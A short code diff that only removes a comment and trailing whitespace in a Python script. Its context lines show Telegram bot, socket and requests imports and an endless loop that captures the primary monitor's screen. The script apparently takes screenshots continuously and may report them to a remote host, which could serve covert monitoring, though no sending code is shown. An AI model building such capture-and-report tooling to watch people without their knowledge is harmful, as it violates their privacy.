@@ -6,7 +6,7 @@ import requests
 import time
 import argparse
 import uuid
-import socket  # Import socket module
+import socket
 
 from telegram import Bot
 
@@ -44,7 +44,7 @@ def main(host=DEFAULT_HOST, key=None):
         while True:
             # Get the size of the primary monitor
             monitor = sct.monitors[1]
-            
+
             # Capture the screen
             screenshot = sct.grab(monitor)
             img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
